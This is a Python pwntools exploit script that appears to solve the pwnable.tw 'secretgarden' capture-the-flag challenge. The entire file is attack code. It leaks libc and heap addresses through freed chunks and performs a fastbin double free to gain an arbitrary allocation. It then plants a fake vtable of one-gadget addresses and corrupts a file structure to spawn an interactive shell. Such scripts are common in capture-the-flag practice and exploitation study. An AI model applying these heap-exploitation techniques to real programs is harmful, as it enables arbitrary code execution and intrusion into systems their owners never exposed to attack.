#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'

libc = ELF('./lib/libc.so.6')
elf = ELF('./secretgarden')
p = process('./secretgarden')
#p = remote('chall.pwnable.tw', 10203)

def _raise(nlen, name, col):
	p.sendlineafter(b':', b'1')
	p.sendlineafter(b':', nlen)
	p.sendafter(b':', name)
	p.sendlineafter(b':', col)

def visit():	
	p.sendlineafter(b':', b'2')

def remove(idx):
	p.sendlineafter(b':', b'3')
	p.sendlineafter(b':', idx)

def get_libc():
	visit()
	p.recvuntil(b'flower[2] :')
	leak = u64(p.recv(6).ljust(8, b'\x00'))

	leak = (((leak >> 8) << 8) | 0x78) - 0x3c3b78
	return leak

def get_heap():
	visit()
	p.recvuntil(b'flower[6] :')
	return u64(p.recv(6).ljust(8, b'\x00')) - 0x1161

def get_vtable(addr):
	return flat(
		p64(addr) * 22
	)

_raise(b'130', b'a', b'a')
_raise(b'130', b'a', b'a')

remove(b'0')
_raise(b'80', b'a', b'a')

libc.address = get_libc()
og = libc.address + 0xf0567
target = libc.address + 0x3c46bd

print(hex(target))

_raise(b'100', b'a', b'a')
_raise(b'100', b'a', b'a')

remove(b'3')
remove(b'4')
remove(b'3')

_raise(b'100', p64(target), b'a')
_raise(b'100', b'a', b'a')
pause()

heap = get_heap()
vt = heap + 0x13a0

print(hex(heap))

_raise(b'100', b'a', b'a')

_raise(b'180', get_vtable(og), b'a')

payload = flat(
	b'\x00' * 19,
	p64(0x00000000ffffffff),
	b'\x00' * 16,
	p64(vt)
)

_raise(b'100', payload, b'a')

p.interactive()
